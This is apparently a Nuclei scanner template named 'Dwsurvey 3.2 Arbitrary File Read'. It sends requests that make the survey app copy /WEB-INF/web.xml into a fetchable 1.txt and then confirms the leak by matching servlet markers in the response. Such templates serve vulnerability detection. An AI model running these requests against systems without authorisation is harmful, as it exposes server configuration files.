id: DIAOWEN-fileRead
info:
  author: Str1am
  name: Dwsurvey 3.2 Arbitrary File Read
  severity: high
  tags: DIAOWEN,fileRead
requests:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - filter-name
    - servlet-name
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/diaowen/toHtml?filePath=/&fileName=1.txt&url=/WEB-INF/web.xml'
  - '{{BaseURL}}/diaowen/1.txt'
